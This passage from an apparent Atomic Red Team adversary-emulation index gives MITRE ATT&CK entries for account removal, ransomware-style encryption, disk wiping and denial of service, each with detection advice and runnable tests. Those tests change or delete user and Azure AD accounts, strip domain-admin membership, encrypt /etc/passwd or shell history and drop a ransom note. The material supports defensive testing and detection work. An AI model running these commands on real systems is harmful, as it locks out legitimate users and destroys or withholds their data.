        [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets may be
        used by adversaries to modify user accounts. In Linux, the <code>passwd</code>
        utility may be used to change passwords. Accounts could also be disabled by
        Group Policy. \n\nAdversaries who use ransomware or similar attacks may first
        perform this and other Impact behaviors, such as [Data Destruction](https://attack.mitre.org/techniques/T1485)
        and [Defacement](https://attack.mitre.org/techniques/T1491), in order to impede
        incident response/recovery before completing the [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486)
        objective. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_contributors:
      - Hubert Mank
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Use process monitoring to monitor the execution and command line parameters of binaries involved in deleting accounts or changing passwords, such as use of [Net](https://attack.mitre.org/software/S0039). Windows event logs may also designate activity associated with an adversary's attempt to remove access to an account:

        * Event ID 4723 - An attempt was made to change an account's password
        * Event ID 4724 - An attempt was made to reset an account's password
        * Event ID 4726 - A user account was deleted
        * Event ID 4740 - A user account was locked out

        Alerting on [Net](https://attack.mitre.org/software/S0039) and these Event IDs may generate a high degree of false positives, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Office 365
      - SaaS
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'Active Directory: Active Directory Object Modification'
      - 'User Account: User Account Modification'
      - 'User Account: User Account Deletion'
      x_mitre_impact_type:
      - Availability
      type: attack-pattern
      id: attack-pattern--b24e2a20-3b3d-4bf0-823b-1ed765398fb0
      created: '2019-10-09T18:48:31.906Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1531
        external_id: T1531
      - source_name: CarbonBlack LockerGoga 2019
        description: CarbonBlack Threat Analysis Unit. (2019, March 22). TAU Threat
          Intelligence Notification – LockerGoga Ransomware. Retrieved April 16, 2019.
        url: https://www.carbonblack.com/2019/03/22/tau-threat-intelligence-notification-lockergoga-ransomware/
      - source_name: Unit42 LockerGoga 2019
        description: Harbison, M. (2019, March 26). Born This Way? Origins of LockerGoga.
          Retrieved April 16, 2019.
        url: https://unit42.paloaltonetworks.com/born-this-way-origins-of-lockergoga/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1531
    atomic_tests:
    - name: Change User Password - Windows
      auto_generated_guid: 1b99ef28-f83c-4ec5-8a08-1a56263a5bb2
      description: |
        Changes the user password to hinder access attempts. Seen in use by LockerGoga. Upon execution, log into the user account "AtomicAdministrator" with
        the password "HuHuHUHoHo283283".
      supported_platforms:
      - windows
      input_arguments:
        user_account:
          description: User account whose password will be changed.
          type: string
          default: AtomicAdministrator
        new_user_password:
          description: Password to use if user account must be created first
          type: string
          default: User2ChangePW!
        new_password:
          description: New password for the specified account.
          type: string
          default: HuHuHUHoHo283283@dJD
      executor:
        command: |
          net user #{user_account} #{new_user_password} /add
          net.exe user #{user_account} #{new_password}
        cleanup_command: 'net.exe user #{user_account} /delete >nul 2>&1

          '
        name: command_prompt
        elevation_required: true
    - name: Delete User - Windows
      auto_generated_guid: f21a1d7d-a62f-442a-8c3a-2440d43b19e5
      description: 'Deletes a user account to prevent access. Upon execution, run
        the command "net user" to verify that the new "AtomicUser" account was deleted.

        '
      supported_platforms:
      - windows
      input_arguments:
        new_user_password:
          description: Password to use if user account must be created first
          type: string
          default: User2DeletePW!
        user_account:
          description: User account to be deleted.
          type: string
          default: AtomicUser
      executor:
        command: |
          net user #{user_account} #{new_user_password} /add
          net.exe user #{user_account} /delete
        name: command_prompt
        elevation_required: true
    - name: Remove Account From Domain Admin Group
      auto_generated_guid: 43f71395-6c37-498e-ab17-897d814a0947
      description: 'This test will remove an account from the domain admins group

        '
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'Requires the Active Directory module for powershell to be installed.

          '
        prereq_command: 'if(Get-Module -ListAvailable -Name ActiveDirectory) {exit
          0} else {exit 1}

          '
        get_prereq_command: 'Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"

          '
      input_arguments:
        super_user:
          description: Account used to run the execution command (must include domain).
          type: string
          default: domain\super_user
        super_pass:
          description: super_user account password.
          type: string
          default: password
        remove_user:
          description: Account to remove from domain admins.
          type: string
          default: remove_user
      executor:
        command: |
          $PWord = ConvertTo-SecureString -String #{super_pass} -AsPlainText -Force
          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{super_user}, $PWord
          if((Get-ADUser #{remove_user} -Properties memberof).memberof -like "CN=Domain Admins*"){
            Remove-ADGroupMember -Identity "Domain Admins" -Members #{remove_user} -Credential $Credential -Confirm:$False
          } else{
              write-host "Error - Make sure #{remove_user} is in the domain admins group" -foregroundcolor Red
          }
        name: powershell
        elevation_required: false
    - name: Change User Password via passwd
      auto_generated_guid: 3c717bf3-2ecc-4d79-8ac8-0bfbf08fbce6
      description: 'This test changes the user password to hinder access to the account
        using passwd utility.

        '
      supported_platforms:
      - macos
      - linux
      input_arguments:
        user_account:
          description: User account whose password will be changed.
          type: string
          default: ARTUser
      executor:
        command: 'passwd #{user_account} #enter admin password > enter new password
          > confirm new password

          '
        name: sh
        elevation_required: true
    - name: Delete User via dscl utility
      auto_generated_guid: 4d938c43-2fe8-4d70-a5b3-5bf239aa7846
      description: 'This test deletes the user account using the dscl utility.

        '
      supported_platforms:
      - macos
      input_arguments:
        user_account:
          description: User account which will be deleted.
          type: string
          default: ARTUser
        user_password:
          description: User password.
          type: string
          default: ARTPassword
      executor:
        command: 'dscl . -delete /Users/#{user_account} #enter admin password

          '
        cleanup_command: |
          dscl . -create /Users/#{user_account} #enter admin password
          dscl . -create /Users/#{user_account} UserShell /bin/bash
          dscl . -create /Users/#{user_account} UniqueID 503
          dscl . -create /Users/#{user_account} NFSHomeDirectory /Users/#{user_account}
          dscl . -passwd /Users/#{user_account} #{user_password} #enter password for new user
        name: sh
        elevation_required: true
    - name: Delete User via sysadminctl utility
      auto_generated_guid: d3812c4e-30ee-466a-a0aa-07e355b561d6
      description: 'This test deletes the user account using the sysadminctl utility.

        '
      supported_platforms:
      - macos
      input_arguments:
        user_account:
          description: User account which will be deleted.
          type: string
          default: ARTUserAccount
        user_name:
          description: New user name.
          type: string
          default: ARTUser
        user_password:
          description: New user password.
          type: string
          default: ARTPassword
      executor:
        command: 'sysadminctl -deleteUser #{user_account} #enter admin password

          '
        cleanup_command: 'sysadminctl -addUser #{user_account} -fullName "#{user_name}"
          -password #{user_password}

          '
        name: sh
        elevation_required: true
    - name: Azure AD - Delete user via Azure AD PowerShell
      auto_generated_guid: 4f577511-dc1c-4045-bcb8-75d2457f01f4
      description: Deletes a user in Azure AD. Adversaries may interrupt availability
        of system and network resources by inhibiting access to accounts utilized
        by legitimate users. Accounts may be deleted, locked, or manipulated (excluding
        changed credentials) to remove access to accounts.
      supported_platforms:
      - azure-ad
      input_arguments:
        userprincipalname:
          description: User principal name (UPN) for the Azure user being deleted
          type: string
          default: atomicredteam@yourdomain.com
      dependency_executor_name: powershell
      dependencies:
      - description: Check if AzureAD PowerShell module is installed
        prereq_command: Get-InstalledModule -Name AzureAD
        get_prereq_command: echo "use the following to install AzureAD PowerShell
          module - Install-Module -Name AzureAD -Scope CurrentUser -Repository PSGallery
          -Force"
      - description: Check if AzureAD PowerShell module is installed
        prereq_command: Update the input arguments so the userprincipalname value
          is accurate for your environment
        get_prereq_command: echo "Update the input arguments in the .yaml file so
          that the userprincipalname value is accurate for your environment"
      executor:
        command: |-
          Connect-AzureAD
          $userprincipalname = "#{userprincipalname}"
          Remove-AzureADUser -ObjectId $userprincipalname
        cleanup_command: N/A
        name: powershell
    - name: Azure AD - Delete user via Azure CLI
      auto_generated_guid: c955c1c7-3145-4a22-af2d-63eea0d967f0
      description: Deletes a user in Azure AD. Adversaries may interrupt availability
        of system and network resources by inhibiting access to accounts utilized
        by legitimate users. Accounts may be deleted, locked, or manipulated (excluding
        changed credentials) to remove access to accounts.
      supported_platforms:
      - azure-ad
      input_arguments:
        userprincipalname:
          description: User principal name (UPN) for the Azure user being deleted
          type: string
          default: atomicredteam@yourdomain.com
      dependency_executor_name: powershell
      dependencies:
      - description: Check if Azure CLI is installed and install manually
        prereq_command: az account list
        get_prereq_command: echo "use the following to install the Azure CLI manually
          https://aka.ms/installazurecliwindows"
      - description: Check if Azure CLI is installed and install via PowerShell
        prereq_command: az account list
        get_prereq_command: echo "use the following to install the Azure CLI $ProgressPreference
          = 'SilentlyContinue'; Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows
          -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I
          AzureCLI.msi /quiet'; Remove-Item .\AzureCLI.msi"
      - description: Update the userprincipalname to meet your requirements
        prereq_command: Update the input arguments so the userprincipalname value
          is accurate for your environment
        get_prereq_command: echo "Update the input arguments in the .yaml file so
          that the userprincipalname value is accurate for your environment"
      executor:
        command: |-
          az login
          $userprincipalname = "#{userprincipalname}"
          az ad user delete --id $userprincipalname
        cleanup_command: N/A
        name: powershell
  T1486:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - IaaS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Oleg Kolesnikov, Securonix
      - Mayuresh Dani, Qualys
      - Harshal Tupsamudre, Qualys
      - Travis Smith, Qualys
      - ExtraHop
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--b80d107d-fa0d-4b60-9684-b0433e8bdba0
      created: '2019-03-15T13:59:30.390Z'
      x_mitre_version: '1.4'
      external_references:
      - source_name: mitre-attack
        external_id: T1486
        url: https://attack.mitre.org/techniques/T1486
      - source_name: CarbonBlack Conti July 2020
        url: https://www.carbonblack.com/blog/tau-threat-discovery-conti-ransomware/
        description: 'Baskin, B. (2020, July 8). TAU Threat Discovery: Conti Ransomware.
          Retrieved February 17, 2021.'
      - source_name: FireEye WannaCry 2017
        url: https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html
        description: Berry, A., Homan, J., and Eitzman, R. (2017, May 23). WannaCry
          Malware Profile. Retrieved March 15, 2019.
      - source_name: Rhino S3 Ransomware Part 1
        url: https://rhinosecuritylabs.com/aws/s3-ransomware-part-1-attack-vector/
        description: 'Gietzen, S. (n.d.). S3 Ransomware Part 1: Attack Vector. Retrieved
          April 14, 2021.'
      - source_name: NHS Digital Egregor Nov 2020
        url: https://digital.nhs.uk/cyber-alerts/2020/cc-3681#summary
        description: NHS Digital. (2020, November 26). Egregor Ransomware The RaaS
          successor to Maze. Retrieved December 29, 2020.
      - source_name: US-CERT Ransomware 2016
        url: https://www.us-cert.gov/ncas/alerts/TA16-091A
        description: 'US-CERT. (2016, March 31). Alert (TA16-091A): Ransomware and
          Recent Variants. Retrieved March 15, 2019.'
      - source_name: US-CERT NotPetya 2017
        url: https://www.us-cert.gov/ncas/alerts/TA17-181A
        description: 'US-CERT. (2017, July 1). Alert (TA17-181A): Petya Ransomware.
          Retrieved March 15, 2019.'
      - source_name: US-CERT SamSam 2018
        url: https://www.us-cert.gov/ncas/alerts/AA18-337A
        description: 'US-CERT. (2018, December 3). Alert (AA18-337A): SamSam Ransomware.
          Retrieved March 15, 2019.'
      x_mitre_deprecated: false
      revoked: false
      description: "Adversaries may encrypt data on target systems or on large numbers
        of systems in a network to interrupt availability to system and network resources.
        They can attempt to render stored data inaccessible by encrypting files or
        data on local and remote drives and withholding access to a decryption key.
        This may be done in order to extract monetary compensation from a victim in
        exchange for decryption or a decryption key (ransomware) or to render data
        permanently inaccessible in cases where the key is not saved or transmitted.(Citation:
        US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT
        NotPetya 2017)(Citation: US-CERT SamSam 2018)\n\nIn the case of ransomware,
        it is typical that common user files like Office documents, PDFs, images,
        videos, audio, text, and source code files will be encrypted (and often renamed
        and/or tagged with specific file markers). Adversaries may need to first employ
        other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222)
        or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in
        order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack
        Conti July 2020) In some cases, adversaries may encrypt critical system files,
        disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) \n\nTo maximize
        impact on the target organization, malware designed for encrypting data may
        have worm-like features to propagate across a network by leveraging other
        attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078),
        [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows
        Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye
        WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also
        leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001),
        such as changing victim wallpapers, or otherwise intimidate victims by sending
        ransom notes or other messages to connected printers (known as \"print bombing\").(Citation:
        NHS Digital Egregor Nov 2020)\n\nIn cloud environments, storage objects within
        compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware
        Part 1)"
      modified: '2022-06-16T13:07:10.318Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Data Encrypted for Impact
      x_mitre_detection: |-
        Use process monitoring to monitor the execution and command line parameters of binaries involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit. Monitor for the creation of suspicious files as well as unusual file modification activity. In particular, look for large quantities of file modifications in user directories.

        In some cases, monitoring for unusual kernel driver installation activity can aid in detection.

        In cloud environments, monitor for events that indicate storage objects have been anomalously replaced by copies.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'File: File Modification'
      - 'Network Share: Network Share Access'
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      - 'File: File Creation'
      - 'Cloud Storage: Cloud Storage Modification'
      x_mitre_impact_type:
      - Availability
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1486
    atomic_tests:
    - name: Encrypt files using gpg (Linux)
      auto_generated_guid: 7b8ce084-3922-4618-8d22-95f996173765
      description: 'Uses gpg to encrypt a file

        '
      supported_platforms:
      - linux
      input_arguments:
        pwd_for_encrypted_file:
          description: the password that you want for the encrypted file
          type: string
          default: passwd
        encrypted_file_path:
          description: path to the encrypted file
          type: path
          default: "/tmp/passwd.gpg"
        input_file_path:
          description: path to the file that you want to encrypt
          type: path
          default: "/etc/passwd"
        encryption_alg:
          description: encryption algorithm of the file
          type: string
          default: AES-256
      dependency_executor_name: bash
      dependencies:
      - description: 'Finds where gpg is located

          '
        prereq_command: 'which_gpg=`which gpg`

          '
        get_prereq_command: "(which yum && yum -y install epel-release gpg)||(which
          apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y gpg)\n"
      executor:
        name: bash
        elevation_required: false
        command: 'echo "#{pwd_for_encrypted_file}" | $which_gpg --batch --yes --passphrase-fd
          0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}

          '
        cleanup_command: 'rm #{encrypted_file_path}

          '
    - name: Encrypt files using 7z (Linux)
      auto_generated_guid: 53e6735a-4727-44cc-b35b-237682a151ad
      description: 'Uses 7z to encrypt a file

        '
      supported_platforms:
      - linux
      input_arguments:
        pwd_for_encrypted_file:
          description: the password that you want for the encrypted file
          type: string
          default: passwd
        encrypted_file_path:
          description: path to the encrypted file
          type: path
          default: "/tmp/passwd.zip"
        input_file_path:
          description: path to the file that you want to encrypt
          type: path
          default: "/etc/passwd"
      dependency_executor_name: bash
      dependencies:
      - description: 'Finds where 7z is located

          '
        prereq_command: 'which_7z=`which 7z`

          '
        get_prereq_command: ''
      executor:
        name: bash
        elevation_required: false
        command: "$which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} #{input_file_path}\n"
        cleanup_command: |
          $which_7z e #{encrypted_file_path}
          rm #{encrypted_file_path}
    - name: Encrypt files using ccrypt (Linux)
      auto_generated_guid: '08cbf59f-85da-4369-a5f4-049cffd7709f'
      description: 'Attempts to encrypt data on target systems as root to simulate
        an inturruption authentication to target system. If root permissions are not
        available then attempts to encrypt data within user''s home directory.

        '
      supported_platforms:
      - linux
      input_arguments:
        cped_file_path:
          description: path where you want your copied file to be
          type: path
          default: "/tmp/passwd"
        root_input_file_path:
          description: path to the file that you want to be encrypted if you are root
            user
          type: path
          default: "/etc/passwd"
        user_input_file_path:
          description: path to file that you want to be encrypted if you are normal
            user
          type: path
          default: "~/.bash_history"
        impact_command:
          description: command to show impact of encryption
          type: string
          default: sudo su
      dependency_executor_name: bash
      dependencies:
      - description: 'Finds where ccencrypt and ccdecrypt is located and copies input
          file

          '
        prereq_command: |
          which_ccencrypt=`which ccencrypt`
          which_ccdecrypt=`which ccdecrypt`
          if [[ $USER == "root" ]]; then cp #{root_input_file_path} #{cped_file_path}; else cp #{user_input_file_path} #{cped_file_path}; fi
        get_prereq_command: "(which yum && yum -y install epel-release ccrypt)||(which
          apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y ccrypt)\n"
      executor:
        name: bash
        elevation_required: false
        command: 'if [[ $USER == "root" ]]; then $which_ccencrypt #{root_input_file_path};
          file #{root_input_file_path}.cpt; #{impact_command}; else $which_ccencrypt
          #{user_input_file_path}; file #{user_input_file_path}.cpt; #{impact_command};
          fi

          '
        cleanup_command: "if [[ $USER == \"root\" ]]; then mv #{cped_file_path} #{root_input_file_path};
          else cp #{cped_file_path} #{user_input_file_path}; fi \n"
    - name: Encrypt files using openssl (Linux)
      auto_generated_guid: 142752dc-ca71-443b-9359-cf6f497315f1
      description: 'Uses openssl to encrypt a file

        '
      supported_platforms:
      - linux
      input_arguments:
        private_key_path:
          description: path to the private key
          type: path
          default: "/tmp/key.pem"
        public_key_path:
          description: path to the public key
          type: path
          default: "/tmp/pub.pem"
        encryption_bit_size:
          description: size of the bit of encryption
          type: integer
          default: 2048
        encrypted_file_path:
          description: path to the encrypted file
          type: path
          default: "/tmp/passwd.zip"
        input_file_path:
          description: path to the file that you want to encrypt
          type: path
          default: "/etc/passwd"
      dependency_executor_name: bash
      dependencies:
      - description: 'Finds where openssl is located

          '
        prereq_command: 'which_openssl=`which openssl`

          '
        get_prereq_command: ''
      executor:
        name: bash
        elevation_required: false
        command: |
          $which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}
          $which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}
          $which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}
        cleanup_command: |
          $which_openssl rsautl -decrypt -inkey #{private_key_path} -in #{encrypted_file_path}
          rm #{encrypted_file_path}
    - name: PureLocker Ransom Note
      auto_generated_guid: 649349c7-9abf-493b-a7a2-b1aa4d141528
      description: "building the IOC (YOUR_FILES.txt) for the PureLocker ransomware
        \nhttps://www.bleepingcomputer.com/news/security/purelocker-ransomware-can-lock-files-on-windows-linux-and-macos/\n"
      supported_platforms:
      - windows
      executor:
        name: command_prompt
        elevation_required: true
        command: 'echo T1486 - Purelocker Ransom Note > %USERPROFILE%\Desktop\YOUR_FILES.txt

          '
        cleanup_command: 'del %USERPROFILE%\Desktop\YOUR_FILES.txt >nul 2>&1

          '
    - name: Data Encrypted with GPG4Win
      auto_generated_guid: 4541e2c2-33c8-44b1-be79-9161440f1718
      description: Gpg4win is a Windows tool (also called Kleopatra which is the preferred
        certificate manager) that uses email and file encryption packages for symmetric
        encryption. It is used by attackers to encrypt disks. User will need to add
        pass phrase to encrypt file as automation is not allowed under newer versions.
      supported_platforms:
      - windows
      input_arguments:
        GPG_Exe_Location:
          description: Path of the GPG program
          type: path
          default: C:\Program Files (x86)\GnuPG\bin\gpg.exe
        File_to_Encrypt_Location:
          description: Path of File
          type: path
          default: "$env:temp\\test.txt"
      dependencies:
      - description: 'GPG must exist at (#{GPG_Exe_Location})

          '
        prereq_command: 'if (test-path ''#{GPG_Exe_Location}''){exit 0} else {exit
          1}

          '
        get_prereq_command: |
          invoke-webrequest "https://files.gpg4win.org/gpg4win-4.1.0.exe" -outfile "$env:temp\gpginstall.exe"
          cmd /c "$env:temp\gpginstall.exe" /S
      executor:
        name: powershell
        elevation_required: false
        command: 'cmd /c ''#{GPG_Exe_Location}'' -c ''#{File_to_Encrypt_Location}''

          '
        cleanup_command: 'remove-item ''#{File_to_Encrypt_Location}.gpg'' -force -erroraction
          silentlycontinue | out-null

          '
  T1488:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--b82f7d37-b826-4ec9-9391-8e121c78aed7
      type: attack-pattern
      created: '2019-03-29T14:59:50.763Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1488
        url: https://attack.mitre.org/techniques/T1488
      - source_name: Novetta Blockbuster
        description: 'Novetta Threat Research Group. (2016, February 24). Operation
          Blockbuster: Unraveling the Long Thread of the Sony Attack. Retrieved February
          25, 2016.'
        url: https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf
      - source_name: Novetta Blockbuster Destructive Malware
        description: 'Novetta Threat Research Group. (2016, February 24). Operation
          Blockbuster: Destructive Malware Report. Retrieved March 2, 2016.'
        url: https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf
      - source_name: DOJ Lazarus Sony 2018
        url: https://www.justice.gov/opa/press-release/file/1092091/download
        description: Department of Justice. (2018, September 6). Criminal Complaint
          - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.
      modified: '2020-02-20T22:07:27.495Z'
      name: Disk Content Wipe
      description: |-
        Adversaries may erase the contents of storage devices on specific systems as well as large numbers of systems in a network to interrupt availability to system and network resources.

        Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk erased instead of individual files.

        To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077).(Citation: Novetta Blockbuster Destructive Malware)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_detection: Look for attempts to read/write to sensitive locations like
        the partition boot sector or BIOS parameter block/superblock. Monitor for
        unusual kernel driver installation activity.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_impact_type:
      - Availability
      x_mitre_permissions_required:
      - User
      - Administrator
      - root
      - SYSTEM
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1499:
    technique:
      modified: '2023-03-30T21:01:44.038Z'
      name: Endpoint Denial of Service
      description: |
        Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)

        An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).

        To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.

        Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.

        Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)

        In cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)

        For attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_contributors:
      - Alfredo Oliveira, Trend Micro
      - David Fiser, @anu4is, Trend Micro
      - Magno Logan, @magnologan, Trend Micro
      - Vishwas Manral, McAfee
      - Yossi Weizman, Azure Defender Research Team
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.

        In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.

        Externally monitor the availability of services that may be targeted by an Endpoint DoS.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Linux
      - macOS
      - Google Workspace
      - Containers
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      - 'Sensor Health: Host Status'
      - 'Application Log: Application Log Content'
      - 'Network Traffic: Network Traffic Content'
      x_mitre_impact_type:
      - Availability
      type: attack-pattern
      id: attack-pattern--c675646d-e204-4aa8-978d-e3d6d65885c4
      created: '2019-04-18T11:00:55.862Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1499
        external_id: T1499
      - source_name: Cisco DoSdetectNetflow
        description: Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow.
          Retrieved April 25, 2019.
        url: https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf
      - source_name: FSISAC FraudNetDoS September 2012
        description: FS-ISAC. (2012, September 17). Fraud Alert – Cyber Criminals
          Targeting Financial Institution Employee Credentials to Conduct Wire Transfer
          Fraud. Retrieved April 18, 2019.
        url: https://www.ic3.gov/media/2012/FraudAlertFinancialInstitutionEmployeeCredentialsTargeted.pdf
      - source_name: ArsTechnica Great Firewall of China
        description: Goodin, D.. (2015, March 31). Massive denial-of-service attack
          on GitHub tied to Chinese government. Retrieved April 19, 2019.
        url: https://arstechnica.com/information-technology/2015/03/massive-denial-of-service-attack-on-github-tied-to-chinese-government/
      - source_name: FireEye OpPoisonedHandover February 2016
        description: 'Ned Moran, Mike Scott, Mike Oppenheim of FireEye. (2014, November
          3). Operation Poisoned Handover: Unveiling Ties Between APT Activity in
          Hong Kong’s Pro-Democracy Movement. Retrieved April 18, 2019.'
        url: https://www.fireeye.com/blog/threat-research/2014/11/operation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html
      - source_name: USNYAG IranianBotnet March 2016
        description: Preet Bharara, US Attorney. (2016, March 24). Retrieved April
          23, 2019.
        url: https://www.justice.gov/opa/pr/seven-iranians-working-islamic-revolutionary-guard-corps-affiliated-entities-charged
      - source_name: Symantec DDoS October 2014
